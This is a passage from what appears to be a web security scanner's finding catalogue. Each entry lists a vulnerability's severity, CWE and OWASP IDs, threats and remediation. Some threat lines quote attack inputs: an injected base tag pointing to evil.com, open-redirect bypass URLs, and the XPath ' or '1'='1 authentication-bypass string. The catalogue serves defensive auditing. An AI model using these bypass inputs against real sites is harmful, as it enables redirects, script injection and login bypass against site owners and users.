            "SameSite=None cookies without Partitioned will be blocked in Chrome 3PCD, silently breaking embedded widget functionality",
            "Partitioned cookies without Secure are invalid per CHIPS spec — browsers may ignore the Partitioned attribute",
            "Partitioned cookies without SameSite=None won't be sent in third-party cross-site contexts",
            "__Host- prefix with Partitioned is incompatible — __Host- requires SameSite=Strict which conflicts with cross-site CHIPS",
        ],
        "remediation": [
            "Add the Partitioned attribute to all SameSite=None cookies used in embedded/third-party contexts",
            "Always combine Partitioned with Secure: Set-Cookie: name=val; SameSite=None; Secure; Partitioned",
            "Audit all SameSite=None cookies and determine which are used in third-party contexts requiring CHIPS",
            "Remove __Host- prefix from cookies that need to be Partitioned for cross-site use",
        ],
    },
    "privacy_sandbox_apis": {
        "severity": "MEDIUM",
        "short": "Privacy Sandbox API Usage",
        "cwe": "CWE-359", "owasp": "A02:2021",
        "threats": [
            "Topics API observation (Observe-Browsing-Topics: ?1) collects user interest categories without explicit consent under GDPR",
            "Attribution Reporting API source/trigger registration enables cross-site attribution tracking — requires consent",
            "Shared Storage write enables cross-site data persistence that can track users across origins",
            "navigator.joinAdInterestGroup() adds users to behavioral targeting groups — requires GDPR consent",
            "Private State Token issuance creates a cross-site anti-fraud fingerprint that may require disclosure",
        ],
        "remediation": [
            "Only activate Topics API observation after obtaining explicit user consent for interest-based tracking",
            "Audit Attribution Reporting API registration headers and ensure consent flows cover attribution tracking",
            "Document all Privacy Sandbox API usage in privacy policy and obtain consent before engaging these APIs",
            "Implement consent-based activation: load Privacy Sandbox integrations only after consent is given",
        ],
    },
    "document_policy_security": {
        "severity": "LOW",
        "short": "Document-Policy Header Issues",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "threats": [
            "Missing no-document-write leaves document.write() DOM sink available — a known XSS injection vector",
            "js-profiling enabled in Document-Policy allows JavaScript profiling access for timing oracle attacks",
            "Missing Require-Document-Policy means embedded iframes are not required to adopt the same security policy",
            "Document-Policy in report-only mode means violations are logged but not blocked",
        ],
        "remediation": [
            "Add 'no-document-write' to Document-Policy to disable the document.write() DOM XSS sink",
            "Remove 'js-profiling' from production Document-Policy; enable only in developer environments",
            "Add Require-Document-Policy: <policy> to enforce document policy on embedded iframes",
            "Migrate Document-Policy-Report-Only to the enforcing Document-Policy header",
        ],
    },
    "cors_null_origin": {
        "severity": "HIGH",
        "short": "CORS Null Origin Bypass",
        "cwe": "CWE-346", "owasp": "A01:2021",
        "threats": [
            "Origin: null is sent by sandboxed iframes, file:// pages, and data: URIs — commonly attacker-controlled contexts",
            "ACAO: null with ACAC: true grants credentialed cross-origin reads to any sandboxed iframe the attacker controls",
            "Attacker embeds a sandboxed iframe on their domain; its requests have Origin: null and receive authenticated responses",
            "Bypasses CORS protections that otherwise restrict which origins can read credentialed responses",
        ],
        "remediation": [
            "Never reflect 'null' in Access-Control-Allow-Origin; allowlist specific origins instead",
            "Remove Access-Control-Allow-Credentials: true when using wildcard or null origins",
            "Validate Origin header against an explicit allowlist of trusted origins",
            "Audit CORS configuration: reject requests with Origin: null by returning no CORS headers",
        ],
    },
    "compression_oracle": {
        "severity": "MEDIUM",
        "short": "Compression Oracle (BREACH/CRIME) Risk",
        "cwe": "CWE-311", "owasp": "A02:2021",
        "threats": [
            "BREACH: HTTP-level gzip/br compression on HTTPS responses containing secrets enables oracle attack",
            "Attacker with network position injects reflected input and measures compressed response size to recover CSRF tokens byte-by-byte",
            "CRIME: TLS-level compression (DEFLATE) similarly leaks secrets from request headers (cookies, auth tokens)",
            "Session tokens, CSRF tokens, and anti-forgery values in compressed responses are all potential targets",
        ],
        "remediation": [
            "Disable HTTP compression for responses containing secrets (CSRF tokens, session data)",
            "Implement CSRF token uniqueness per request (masked tokens) to defeat byte-at-a-time recovery",
            "Ensure TLS compression is disabled (modern TLS implementations disable it by default)",
            "Consider adding random noise padding to compressed responses containing sensitive tokens",
        ],
    },
    "form_action_hijacking": {
        "severity": "HIGH",
        "short": "Form Action Hijacking",
        "cwe": "CWE-601", "owasp": "A03:2021",
        "threats": [
            "Forms submitting to external domains exfiltrate user data (credentials, PII) to attacker-controlled servers",
            "javascript: URI form actions execute arbitrary JS on form submit, bypassing same-origin protections",
            "data: URI form actions provide unusual behavior potentially used to bypass security controls",
            "HTTP form action on HTTPS page sends credentials in plaintext (mixed content POST)",
            "Password and payment fields in forms with external actions directly exfiltrate sensitive user data",
        ],
        "remediation": [
            "Ensure form action attributes only point to same-origin HTTPS endpoints",
            "Implement Content Security Policy with form-action directive to restrict valid form targets",
            "Audit all third-party payment and form processors — verify they use HTTPS and are intentional",
            "Block javascript: and data: URIs in form actions via CSP or server-side output encoding",
        ],
    },
    "js_dangerous_patterns": {
        "severity": "HIGH",
        "short": "Dangerous JavaScript Patterns (DOM XSS)",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "eval(location.*) executes attacker-controlled URL fragment or query parameters as code — direct DOM XSS",
            "innerHTML assigned from location.hash/search/href writes attacker HTML directly into the DOM",
            "document.write() with URL-derived data injects arbitrary HTML including scripts",
            "new Function() and setTimeout/setInterval with string arguments function as eval() alternatives",
            "postMessage listeners without event.origin checks accept messages from any cross-origin frame",
            "Dynamic script elements loaded without integrity attribute are vulnerable to CDN compromise",
        ],
        "remediation": [
            "Replace eval(tainted) with safe parsers (JSON.parse, parseInt) or sandboxed iframes",
            "Replace innerHTML/document.write with textContent or DOM APIs (createElement, appendChild)",
            "Add event.origin checks to all postMessage listeners; reject messages from untrusted origins",
            "Add integrity (SRI) and crossorigin attributes to all dynamically-created script elements",
            "Enable Trusted Types CSP policy to enforce safe DOM manipulation patterns",
        ],
    },
    "importmap_security": {
        "severity": "HIGH",
        "short": "ES Module Import Map Security Issues",
        "cwe": "CWE-829", "owasp": "A06:2021",
        "threats": [
            "External CDN module URLs without SRI in import maps: CDN compromise replaces core dependencies for all ES module imports",
            "HTTP (cleartext) module URLs in import maps: trivial MITM injection of malicious module code",
            "data: or javascript: module specifiers in import maps execute attacker code on import",
            "Global scope '/' override remaps all relative imports — high-impact if attacker-influenced",
            "Multiple import maps: only first is honoured; subsequent maps silently ignored, creating confusion",
        ],
        "remediation": [
            "Host ES modules on your own origin rather than external CDNs — import maps lack SRI support",
            "Restrict import map content via CSP script-src with hash-based allowlist",
            "Never allow data: or javascript: in module specifiers — enforce via CSP",
            "Use specific scope paths rather than '/' to avoid unintended global module remapping",
            "Maintain exactly one import map per page; validate JSON syntax before deployment",
        ],
    },
    "permissions_policy_deep": {
        "severity": "MEDIUM",
        "short": "Permissions-Policy Exposes Sensitive Features",
        "cwe": "CWE-276", "owasp": "A05:2021",
        "threats": [
            "camera/microphone allowed for all origins: embedded third-party iframes can activate hardware sensors",
            "payment=*: embedded iframes can initiate Payment Request dialogs without user awareness",
            "display-capture=*: any embedded iframe can initiate screen recording",
            "interest-cohort/browsing-topics not opted out: user browsing cohort data exposed to embedded parties",
            "idle-detection=*: third-party iframes infer user presence and inactivity state",
            "Accelerometer/gyroscope/magnetometer not restricted: fingerprinting and timing side-channel from iframes",
        ],
        "remediation": [
            "Deny all sensitive features by default: Permissions-Policy: camera=(), microphone=(), geolocation=()",
            "Explicitly opt out of privacy APIs: interest-cohort=(), browsing-topics=()",
            "Grant sensitive features only to same-origin: camera=(self), not camera=*",
            "Migrate Permissions-Policy-Report-Only to the enforcing Permissions-Policy header",
            "Regularly audit which iframes need which features and grant only what is necessary",
        ],
    },
    "base_uri_injection": {
        "severity": "HIGH",
        "short": "Base URI Injection / Missing base-uri CSP",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "threats": [
            "Missing base-uri CSP: attacker injects <base href='https://evil.com/'> to redirect all relative resource loads",
            "With base tag injection, all relative <script src>, <link href>, <form action> resolve to attacker's origin",
            "base-uri wildcard (*) provides zero protection — same as omitting the directive",
            "<base href> to external origin silently redirects all relative fetches to a different host",
            "HTTP base href on HTTPS page downgrades all relative resource loads to cleartext",
        ],
        "remediation": [
            "Add base-uri 'self' or base-uri 'none' to every Content-Security-Policy",
            "Never set base-uri to '*'; use specific origins or 'none'",
            "Ensure <base href> only uses HTTPS and points to the same origin",
            "Use exactly one <base> element per page; validate for injection in dynamic HTML generation",
            "Apply output encoding to any user-controlled content that may appear in <head>",
        ],
    },
    "js_supply_chain_integrity": {
        "severity": "HIGH",
        "short": "External JS Without Subresource Integrity",
        "cwe": "CWE-494", "owasp": "A06:2021",
        "threats": [
            "External CDN scripts without SRI: BGP hijacking, DNS poisoning, or CDN compromise silently replaces trusted libraries",
            "Popular CDN compromise (jsdelivr, cdnjs, unpkg) can affect thousands of sites simultaneously",
            "SRI without crossorigin attribute allows CORS-blocked responses to bypass integrity checks",
            "Module preload without integrity attribute: browser pre-fetches attacker-controlled modules",
            "Dynamic import() of external URLs cannot use SRI — any URL can be imported at runtime",
            "Mixed SRI posture: one unprotected external script negates the security of all SRI-protected ones",
        ],
        "remediation": [
            "Add integrity='sha384-...' and crossorigin='anonymous' to all external <script> tags",
            "Generate SRI hashes with: openssl dgst -sha384 -binary file.js | openssl base64 -A",
            "Bundle third-party dependencies locally to eliminate CDN dependency entirely",
            "Restrict dynamic import() targets via strict script-src CSP (hash-based, no wildcards)",
            "Use CSP script-src with specific hashes to enumerate allowed script content",
        ],
    },
    "svg_security": {
        "severity": "HIGH",
        "short": "SVG Security — Scripts and Event Handlers",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "SVG with embedded <script>: executes in page origin when rendered inline or as standalone document",
            "SVG event handler attributes (onload, onclick): fire JavaScript without explicit script tags",
            "<foreignObject> embeds arbitrary HTML inside SVG — common XSS bypass technique",
            "External <use href> loads from attacker-controlled SVG sprite files",
            "User-uploaded SVGs served without Content-Disposition: attachment render with script execution",
            "SMIL animation event handlers (onbegin, onend) fire JavaScript from animation lifecycle",
        ],
        "remediation": [
            "Sanitize SVGs using DOMPurify or svgo with trusted types configuration before serving",
            "Serve user-uploaded SVGs with Content-Disposition: attachment; filename=file.svg",
            "Reject SVG uploads containing <script>, event handlers, or <foreignObject>",
            "Serve SVGs from a separate sandboxed origin (e.g., static.example.com)",
            "Add CSP img-src and object-src restrictions to limit SVG rendering contexts",
        ],
    },
    "css_exfiltration": {
        "severity": "HIGH",
        "short": "CSS Data Exfiltration Attack Surface",
        "cwe": "CWE-200", "owasp": "A03:2021",
        "threats": [
            "CSS attribute selectors + background-url: leak CSRF tokens byte-by-byte without JavaScript",
            "CSS @import of external URLs loads attacker-controlled stylesheets with exfiltration rules",
            "No style-src CSP restriction with CSRF tokens: any CSS injection can target form field values",
            "unsafe-inline in style-src with CSRF tokens: injected inline CSS can exfiltrate secrets",
            "External stylesheets without SRI: CDN compromise injects CSS exfiltration rules globally",
        ],
        "remediation": [
            "Add style-src 'self' to CSP and remove 'unsafe-inline'; use nonces/hashes for inline styles",
            "Never allow user-controlled content inside <style> blocks or inline style= attributes",
            "Add SRI integrity to all external stylesheet <link> tags",
            "Use font-src directive in CSP to restrict @font-face source URLs",
            "Consider using CSS nonce-based approach to block injected stylesheets",
        ],
    },
    "local_storage_sensitive": {
        "severity": "HIGH",
        "short": "Sensitive Data in Web Storage (localStorage)",
        "cwe": "CWE-922", "owasp": "A02:2021",
        "threats": [
            "JWT/OAuth tokens in localStorage: XSS on any page reads and exfiltrates authentication tokens",
            "Passwords stored in Web Storage: accessible to all same-origin JS including XSS payloads",
            "API keys in localStorage: credentials stolen by any XSS vulnerability on the site",
            "CSRF tokens in localStorage: defeats CSRF protection — XSS can read and replay tokens",
            "Browser extensions with host permissions can read localStorage across sessions",
            "Session tokens in localStorage persist beyond browser tab/session unlike sessionStorage",
        ],
        "remediation": [
            "Store authentication tokens in httpOnly, Secure, SameSite=Strict cookies instead of localStorage",
            "Use sessionStorage (not localStorage) for data that should not persist across tabs",
            "Never store passwords, API keys, or private keys in any Web Storage",
            "Store CSRF tokens in httpOnly cookies (double-submit or synchronizer token pattern)",
            "Implement strict CSP to reduce XSS risk that would allow localStorage theft",
        ],
    },
    "relative_path_overwrite": {
        "severity": "MEDIUM",
        "short": "Relative Path Overwrite (RPO) Vulnerability",
        "cwe": "CWE-116", "owasp": "A03:2021",
        "threats": [
            "Browser resolves relative CSS/JS from wrong base URL on ambiguous paths (no trailing slash)",
            "Attacker requests /page/../../injected which resolves relative CSS from /page/injected/",
            "If injected path serves reflected user input as HTML, browser parses it as CSS",
            "Injected CSS can exfiltrate CSRF tokens via attribute selectors without JavaScript",
            "Missing X-Content-Type-Options: nosniff amplifies RPO by allowing content sniffing",
        ],
        "remediation": [
            "Use root-relative (/styles.css) or absolute URLs for all stylesheet and script references",
            "Ensure URLs consistently use trailing slashes for directory resources (301 redirect)",
            "Add X-Content-Type-Options: nosniff to all responses to prevent content type sniffing",
            "Validate all URL routing so path traversal variants return 404 rather than the same content",
            "Avoid including user-controlled content in responses served from ambiguous path URLs",
        ],
    },
    "url_parser_differential": {
        "severity": "HIGH",
        "short": "URL Parser Differential / Open Redirect Bypass",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "threats": [
            "user@host URL syntax: 'https://evil.com@trusted.com/' sends users to trusted.com but string-check sees evil.com",
            "Backslash normalization: 'https://example.com\\evil.com' — browser converts \\ to / yielding cross-origin redirect",
            "Null byte in URL: 'https://trusted.com%00.evil.com' — null terminates C-based parser allow-list check",
            "Protocol-relative URLs (//evil.com) bypass scheme-based allow-list checks",
            "Double-slash in redirect target followed by external domain bypasses prefix checks",
        ],
        "remediation": [
            "Parse redirect targets with a strict URL library (Python urllib.parse, Node URL) before allow-list comparison",
            "Compare the parsed hostname and scheme — never compare raw strings",
            "Reject any redirect target containing @, \\, %00, or starting with //",
            "Use a strict allow-list of complete origins (scheme + host) for all redirects",
            "Audit all open redirect endpoints (redirect, return_to, next, url, dest parameters)",
        ],
    },
    "exposed_backup_files": {
        "severity": "HIGH",
        "short": "Exposed Backup / Temporary Files",
        "cwe": "CWE-530", "owasp": "A05:2021",
        "threats": [
            "config.php.bak or wp-config.php~ exposes database credentials in plaintext",
            ".git/config reveals repository URL, author info, and potentially embedded credentials",
            "dump.sql or database.sql exposes full database contents including password hashes",
            "Source archives (backup.zip, site.tar.gz) expose entire application source code",
            "Editor swap files (.swp) contain partial source code with potential credential patterns",
        ],
        "remediation": [
            "Add deny rules for backup extensions (.bak, .orig, .old, ~, .swp) in web server config",
            "Use .htaccess or nginx location blocks to return 404 for backup extensions",
            "Implement pre-deployment checks to ensure no backup files exist in web root",
            "Move sensitive config files outside the web root; use environment variables for secrets",
            "Periodically run: find /var/www -name '*.bak' -o -name '*~' to catch lingering files",
        ],
    },
    "client_side_redirect": {
        "severity": "HIGH",
        "short": "Client-Side Open Redirect (JavaScript)",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "threats": [
            "location.href from URLSearchParams: attacker crafts ?next=https://evil.com to redirect users",
            "location.href = location.hash.slice(1): attacker controls URL fragment, redirecting via #https://evil.com",
            "location = document.referrer: attacker controls Referer header from a link on their page",
            "postMessage-triggered redirect: any cross-origin page can send a redirect target via postMessage",
            "Meta refresh to external URL: HTML injection that redirects users without server involvement",
        ],
        "remediation": [
            "Validate all redirect targets against an explicit allow-list of trusted origins before assigning to location",
            "Parse redirect URLs with the URL API and compare only the hostname property",
            "Never use document.referrer, location.hash, or postMessage data as redirect targets without validation",
            "Add event.origin checks to all postMessage listeners before processing navigation messages",
            "Replace meta http-equiv='refresh' with server-side redirects for better control",
        ],
    },
    "iframe_allow_security": {
        "severity": "HIGH",
        "short": "Dangerous Iframe Permission Delegation",
        "cwe": "CWE-732", "owasp": "A05:2021",
        "threats": [
            "allow='*' grants every browser feature (camera, mic, payment, USB) to cross-origin iframes",
            "allow='camera' or allow='microphone' on third-party iframes enables covert eavesdropping",
            "allow='payment' enables embedded iframes to initiate Payment Request dialogs",
            "sandbox='allow-scripts allow-same-origin' combination defeats the sandbox entirely",
            "Cross-origin iframes without sandbox can run scripts, navigate parent, and access parent cookies",
        ],
        "remediation": [
            "Never use allow='*'; enumerate only required features explicitly",
            "Restrict high-risk features: camera, microphone, payment, usb should rarely be delegated to iframes",
            "Add sandbox attribute to all third-party iframes with minimum required tokens",
            "Never combine allow-scripts and allow-same-origin in sandbox attribute",
            "Implement Permissions-Policy header to enforce per-origin feature restrictions",
        ],
    },
    "package_manifest_exposure": {
        "severity": "HIGH",
        "short": "Exposed Dependency Manifest Files",
        "cwe": "CWE-200", "owasp": "A06:2021",
        "threats": [
            "Exposed package.json reveals exact dependency versions — enables targeted CVE exploitation",
            ".npmrc with authToken: attacker can authenticate to private npm registry and inject packages",
            "composer.lock / Gemfile.lock: exact transitive dependency tree for supply chain mapping",
            "requirements.txt: Python dependency versions matching known vulnerable releases",
            "go.mod / pom.xml: precise library versions for matching against CVE databases",
        ],
        "remediation": [
            "Block web server access to manifest files: deny all in nginx for *.json, *.lock, *.toml",
            "Move .npmrc and credential files outside the web root entirely",
            "Serve only compiled artifacts from the web root — no source files",
            "Add /.npmrc, /package.json, /composer.json to robots.txt (security through obscurity only)",
            "Rotate any auth tokens that were exposed in accessible .npmrc files",
        ],
    },
    "canvas_fingerprinting": {
        "severity": "MEDIUM",
        "short": "Browser Fingerprinting API Usage",
        "cwe": "CWE-359", "owasp": "A02:2021",
        "threats": [
            "Canvas fingerprinting: hardware rendering differences identify users across sessions without cookies",
            "WebGL RENDERER/VENDOR: GPU model uniquely identifies a device across origins and sessions",
            "AudioContext fingerprinting: DAC/driver differences create sub-millisecond unique values",
            "Battery status API: charge level uniquely identifies a device (deprecated in most browsers)",
            "navigator.hardwareConcurrency + deviceMemory: hardware profile creates stable long-term identifier",
        ],
        "remediation": [
            "Audit all fingerprinting usage — determine if it is necessary or if pseudonymous alternatives exist",
            "Disclose fingerprinting in privacy policy if used for tracking; obtain user consent (GDPR Art. 6)",
            "Avoid combining multiple fingerprinting signals — each addition increases uniqueness exponentially",
            "Consider privacy-preserving alternatives: server-side session tokens, explicit user consent flows",
            "Modern browsers (Firefox, Brave, Safari) randomize canvas and audio output to mitigate tracking",
        ],
    },
    "hardcoded_credentials": {
        "severity": "CRITICAL",
        "short": "Hardcoded Credentials in Page JavaScript",
        "cwe": "CWE-798", "owasp": "A07:2021",
        "threats": [
            "AWS Access Key in JS: attacker can provision infrastructure, exfiltrate S3 data, delete resources",
            "Stripe secret key in JS: attacker can charge cards, refund transactions, access customer data",
            "GitHub PAT in JS: attacker can access repositories, push malicious code, delete branches",
            "Slack token in JS: attacker can read all channel messages, impersonate the bot",
            "OAuth client secret in JS: attacker can impersonate the OAuth application, forge tokens",
            "Private key PEM in JS: attacker can decrypt traffic, forge signatures, authenticate as the server",
        ],
        "remediation": [
            "Remove all credentials from client-side JavaScript immediately and rotate exposed secrets",
            "Use server-side proxy endpoints that call external APIs with server-stored credentials",
            "Load secrets from environment variables at server runtime — never embed in client bundles",
            "Implement secret scanning in CI/CD (GitHub secret scanning, truffleHog, detect-secrets)",
            "Use API key restrictions (IP allowlist, HTTP referrer) for any client-side keys that are unavoidable",
        ],
    },
    "private_network_access": {
        "severity": "HIGH",
        "short": "Private Network Access (PNA) Misconfiguration",
        "cwe": "CWE-441", "owasp": "A01:2021",
        "threats": [
            "Private IP with ACAO: * allows any public site to read internal router/IoT/API data via victim's browser",
            "Localhost endpoints with wildcard CORS expose developer tools, DB admin UIs, and local services",
            "Cross-origin requests to private network bypass firewall/network segmentation via user's browser",
            "Public-to-private CORS enables SSRF-equivalent attacks without server-side request",
            "API endpoints with ACAO: * on authenticated routes expose session data cross-origin",
        ],
        "remediation": [
            "Remove ACAO: * from all private network endpoints; restrict to specific trusted public origins",
            "Implement Private Network Access (PNA) preflight handling on internal services",
            "Add Access-Control-Allow-Private-Network: true only where cross-origin private access is intentional",
            "Firewall internal services at the network level; do not rely on CORS for access control",
            "Enable Chrome's PNA enforcement (available in Chrome 98+) to block unauthorized preflight bypass",
        ],
    },
    "jsonp_endpoint": {
        "severity": "HIGH",
        "short": "JSONP Endpoint Cross-Origin Data Theft",
        "cwe": "CWE-829", "owasp": "A01:2021",
        "threats": [
            "JSONP callback reflection: any website can steal authenticated API data with a <script src='...'> tag",
            "JSONP bypasses CORS: browser includes cookies automatically in <script> src requests",
            "Authenticated user data (email, tokens, PII) returned in JSONP response is fully readable cross-origin",
            "Callback parameter XSS: unsanitized callback value reflected as JavaScript function name",
            "JSONP used for CSRF-like data exfiltration without requiring CSRF token bypass",
        ],
        "remediation": [
            "Remove all JSONP endpoints; replace with CORS headers (Access-Control-Allow-Origin: trusted-origin)",
            "If JSONP must be maintained, validate callback values against a strict allowlist ([a-zA-Z][a-zA-Z0-9_]*)",
            "Add CSP script-src restrictions that prevent attacker pages from loading your JSONP endpoints",
            "Require anti-CSRF tokens on all state-changing API endpoints",
            "Audit all URL parameters for ?callback=, ?jsonp=, ?cb= patterns in server routing",
        ],
    },
    "http_security_consistency": {
        "severity": "MEDIUM",
        "short": "Inconsistent Security Headers Across Paths",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "threats": [
            "CSP on main page but absent on /api/*: XSS on API responses executes without policy restriction",
            "X-Frame-Options absent on /login or error pages: clickjacking captures credentials",
            "HSTS absent on API paths: downgrade attack possible for API calls",
            "X-Content-Type-Options absent on static assets: content sniffing bypasses type-based security",
            "Security headers only on main page create false sense of security — every response needs them",
        ],
        "remediation": [
            "Apply security headers at the web server level (not application level) so all responses are covered",
            "Use nginx add_header or Apache Header directives at the server/vhost block level",
            "Add automated tests that verify security headers on multiple response types (/api, /login, /static, 404)",
            "Consider a security header middleware that applies consistently to all routes",
            "Use Mozilla Observatory or security header scanners against multiple paths, not just the homepage",
        ],
    },
    "api_authentication_exposure": {
        "severity": "HIGH",
        "short": "Unauthenticated API Endpoint Access",
        "cwe": "CWE-306", "owasp": "A01:2021",
        "threats": [
            "Exposed /api/users: full user list (email, roles) without authentication",
            "Exposed Swagger/OpenAPI docs: complete API attack surface map for unauthenticated attackers",
            "Admin API endpoints returning 200: configuration, secrets, or management functions exposed",
            "API versioning bypass: v1 requires auth, v0 does not — older version still has same functionality",
            "Debug/diagnostics API exposing environment variables, database credentials, internal paths",
        ],
        "remediation": [
            "Add authentication middleware to all API routes — no endpoint should default to open access",
            "Return 401 with WWW-Authenticate for unauthenticated requests; 403 for insufficient permissions",
            "Restrict Swagger/OpenAPI documentation to authenticated users or internal network only",
            "Implement API gateway or reverse proxy with authentication enforcement before routing",
            "Audit all API versions for feature parity in authorization requirements",
        ],
    },
    "tabnabbing": {
        "severity": "MEDIUM",
        "short": "Reverse Tabnabbing via window.opener",
        "cwe": "CWE-1022", "owasp": "A05:2021",
        "threats": [
            "target=_blank without rel=noopener: child tab can redirect parent (opener) to phishing page",
            "window.open() without noopener: newly opened tab retains reference to opener window",
            "Phishing amplification: attacker controls opened tab, redirects user's original session to fake login",
            "window.opener.location overwrite: attacker redirects authenticated user to credential harvesting page",
        ],
        "remediation": [
            "Add rel=\"noopener noreferrer\" to all target=_blank links",
            "Use window.open(url, '_blank', 'noopener,noreferrer') for programmatic window opening",
            "Set window.opener = null in opened windows if you control them",
            "Enable CSP header to restrict what child tabs can do",
            "Consider removing target=_blank unless strictly needed — same-tab navigation is safer",
        ],
        "references": ["https://owasp.org/www-community/attacks/Reverse_Tabnabbing"],
    },
    "exif_metadata_exposure": {
        "severity": "MEDIUM",
        "short": "EXIF Metadata Leakage in Images",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "GPS coordinates in EXIF: reveals exact location where photo was taken (user home, office)",
            "Camera model in EXIF: device fingerprinting, links photos to specific device",
            "Software version in EXIF: reveals editing software, OS, application versions for attack surface",
            "Author/artist EXIF field: PII disclosure — real name, username, email embedded in image file",
            "Timestamps in EXIF: reveals user activity patterns, timezone, exact time of image capture",
        ],
        "remediation": [
            "Strip EXIF metadata server-side before serving user-uploaded images (ImageMagick: -strip, Pillow: save without exif)",
            "Use a media processing pipeline that normalizes images on upload",
            "Never serve original uploaded files directly — always re-encode/resize",
            "Apply CSP to restrict loaded media origins",
            "Audit existing uploaded images for metadata leakage",
        ],
        "references": ["https://cwe.mitre.org/data/definitions/200.html"],
    },
    "graphql_csrf": {
        "severity": "HIGH",
        "short": "GraphQL CSRF Vulnerability",
        "cwe": "CWE-352", "owasp": "A01:2021",
        "threats": [
            "GET mutation accepted: CSRF attack using a simple image/link tag — no CORS preflight triggered",
            "form-urlencoded accepted: cross-site form POST to GraphQL bypasses CORS preflight requirement",
            "No custom CSRF header: no X-Requested-With or anti-CSRF token required for mutations",
            "Unauthenticated mutations: state-changing operations without auth token validation",
            "Combined with CORS misconfiguration: credentials included in cross-origin GraphQL requests",
        ],
        "remediation": [
            "Reject mutations via GET — only accept POST with Content-Type: application/json",
            "Block application/x-www-form-urlencoded and multipart/form-data for GraphQL endpoints",
            "Require a custom header (X-Requested-With: XMLHttpRequest) that cannot be set by cross-origin forms",
            "Implement anti-CSRF tokens or use SameSite=Strict cookies",
            "Use persisted queries to prevent arbitrary mutation injection",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"],
    },
    "phi_exposure": {
        "severity": "CRITICAL",
        "short": "PHI (Protected Health Information) Exposed in API",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "SSN/social security number pattern in API response: identity theft, fraud, regulatory violation",
            "Date of birth exposed unauthenticated: enables account takeover, identity verification bypass",
            "Diagnosis/ICD codes returned: health condition disclosure, insurance discrimination, HIPAA violation",
            "Medication/prescription data exposed: enables targeted social engineering, HIPAA breach",
            "FHIR Patient resource accessible without auth: full healthcare record exposure, regulatory fines",
            "Medical record number (MRN) disclosed: enables record linkage attacks across healthcare systems",
        ],
        "remediation": [
            "Require strong authentication (OAuth2/OIDC) for all PHI-adjacent endpoints",
            "Implement field-level access control — return only fields the authenticated user is authorized for",
            "Encrypt PHI at rest and in transit with FIPS 140-2 validated algorithms",
            "Implement audit logging for all PHI access (who accessed what and when)",
            "Conduct HIPAA Security Rule assessment; engage compliance officer before deployment",
            "Apply data minimization — return minimum necessary PHI per HIPAA minimum necessary standard",
        ],
        "references": ["https://www.hhs.gov/hipaa/for-professionals/security/index.html"],
    },
    "http_method_tampering": {
        "severity": "HIGH",
        "short": "HTTP Method Override / Verb Tunneling",
        "cwe": "CWE-650", "owasp": "A01:2021",
        "threats": [
            "X-HTTP-Method-Override: DELETE accepted on GET: CSRF attack deletes resources via image/link tag",
            "_method=DELETE param accepted: form-based CSRF bypasses SameSite cookie protection on DELETE",
            "Method tunneling enables CSRF: GET requests that trigger destructive state changes",
            "Authorization bypass: DELETE restricted to admins but method override header bypasses check",
            "Audit log confusion: logs show GET but actual operation was DELETE/PUT",
        ],
        "remediation": [
            "Disable X-HTTP-Method-Override and _method support entirely if not needed",
            "If needed, apply same authorization checks to overridden methods as the real HTTP method",
            "Require CSRF token for all state-changing operations regardless of HTTP method",
            "Log the override header in audit logs to maintain accurate records",
            "Test all API endpoints for method override acceptance as part of security review",
        ],
        "references": ["https://owasp.org/www-community/attacks/Cross_Site_Tracing"],
    },
    "csrf_double_submit": {
        "severity": "HIGH",
        "short": "Weak CSRF Token / Double-Submit Cookie Bypass",
        "cwe": "CWE-352", "owasp": "A01:2021",
        "threats": [
            "Form without CSRF token: cross-site form POST succeeds — attacker triggers account changes",
            "Double-submit cookie readable from subdomain: attacker sets matching cookie/param pair",
            "Static CSRF token: value never rotates, token leak from one user enables CSRF for any session",
            "CSRF token in URL: value exposed via Referer header to third-party origins",
            "SameSite=None without CSRF token: cookies sent cross-origin enabling all form-based attacks",
        ],
        "remediation": [
            "Use synchronizer token pattern: server-generated, per-session, cryptographically random CSRF token",
            "Validate CSRF token on every state-changing request (POST, PUT, DELETE, PATCH)",
            "Do not use double-submit cookie pattern if subdomains are untrusted",
            "Set SameSite=Strict on session cookies as defense-in-depth (not sole protection)",
            "Rotate CSRF tokens after authentication and on each sensitive operation",
        ],
        "references": ["https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"],
    },
    "xpath_injection_passive": {
        "severity": "HIGH",
        "short": "XPath/LDAP Injection (Passive Detection)",
        "cwe": "CWE-643", "owasp": "A03:2021",
        "threats": [
            "XPathException in response: confirms XPath query construction from user input — auth bypass possible",
            "LDAP error disclosed: LDAP filter uses untrusted input — attacker crafts filter to extract all accounts",
            "XML parse error from user input: XXE or injection may be possible in XML processing pipeline",
            "XPath auth bypass: ' or '1'='1 in username/password field bypasses XPath-based authentication",
            "XQuery injection: dynamic XQuery construction enables data extraction from XML database",
        ],
        "remediation": [
            "Use parameterized XPath queries (never string-concatenate user input into XPath expressions)",
            "Sanitize all inputs used in XPath: escape single quotes, apostrophes, and XPath metacharacters",
            "Use LDAP filter escaping libraries (e.g., org.apache.directory.api.ldap.model.filter)",
            "Catch and swallow all XPath/XML/LDAP exceptions — never expose to client",
            "Implement allowlist validation on inputs used in XML/XPath queries",
        ],
        "references": ["https://owasp.org/www-community/attacks/XPATH_Injection"],
    },
    "session_token_exposure": {
        "severity": "HIGH",
        "short": "Session / Auth Token Exposure via URL or Body",
        "cwe": "CWE-598", "owasp": "A02:2021",
        "threats": [
            "Token in URL query param: appears in server access logs, proxy logs, browser history — stolen by log access",
            "Token in Referer header: when user clicks external link, token sent to third-party in Referer header",
            "Bearer token in HTML body: JavaScript can read and exfiltrate via XSS; cached in browser history",
            "JSESSIONID/PHPSESSID in URL: Java/PHP default session URL rewriting leaks session to referrers",
            "JWT in localStorage link: persists across tabs, exfiltrated by any XSS on the domain",
        ],
        "remediation": [
            "Never put session tokens in URLs — use HTTP-only cookies or Authorization: Bearer header",
